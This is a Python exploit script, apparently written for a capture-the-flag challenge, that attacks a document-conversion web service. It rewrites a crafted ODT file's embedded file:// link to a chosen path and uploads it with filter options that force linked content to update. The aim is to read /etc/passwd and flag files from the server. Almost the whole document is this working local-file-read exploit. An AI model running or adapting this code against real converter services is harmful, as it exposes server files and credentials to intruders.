#!/usr/bin/env python3
"""Temporary CTF converter probe; sends only our crafted ODT to the target."""
import io
import pathlib
import urllib.error
import urllib.request
import uuid
import zipfile

BASE = "http://njwqato3tpdz0t6k.instances.ctfcup.online"
POC = pathlib.Path(__file__).with_name("poc.odt")


def payload(target):
    source = io.BytesIO(POC.read_bytes())
    out = io.BytesIO()
    with zipfile.ZipFile(source) as zin, zipfile.ZipFile(out, "w") as zout:
        for info in zin.infolist():
            data = zin.read(info.filename)
            if info.filename == "content.xml":
                data = data.replace(b"file:///etc/passwd", b"file://" + target.encode())
            zout.writestr(info, data)
    return out.getvalue()


def convert(target, fmt="txt", fields=None):
    data = payload(target)
    boundary = "----Arena" + uuid.uuid4().hex
    prefix = b""
    for name, value in (fields or {}).items():
        prefix += (
            f"--{boundary}\r\nContent-Disposition: form-data; name=\"{name}\"\r\n\r\n{value}\r\n"
        ).encode()
    body = prefix + (
        f"--{boundary}\r\n"
        'Content-Disposition: form-data; name="data"; filename="probe.odt"\r\n'
        "Content-Type: application/vnd.oasis.opendocument.text\r\n\r\n"
    ).encode() + data + f"\r\n--{boundary}--\r\n".encode()
    url = BASE + "/cool/convert-to/" + fmt
    req = urllib.request.Request(url, data=body, method="POST")
    req.add_header("Content-Type", "multipart/form-data; boundary=" + boundary)
    req.add_header("Content-Length", str(len(body)))
    req.add_header("User-Agent", "Mozilla/5.0")
    print("\n" + "=" * 25, "CONVERT", target, "TO", fmt, "FIELDS", fields, "BYTES", len(data), flush=True)
    try:
        with urllib.request.urlopen(req, timeout=90) as r:
            raw = r.read(500000)
            print("STATUS", r.status, "HEADERS", r.headers, flush=True)
            print("RESPONSE", raw.decode("utf-8", "replace"), flush=True)
    except urllib.error.HTTPError as e:
        print("HTTP ERROR", e.code, e.headers, e.read(200000).decode("utf-8", "replace"), flush=True)
    except Exception as e:
        print("ERROR", repr(e), flush=True)


for mode in ("1", "3"):
    options = {"infilterOptions": "UpdateDocMode=" + mode}
    for path in ("/etc/passwd", "/flag", "/flag.txt"):
        convert(path, fields=options)
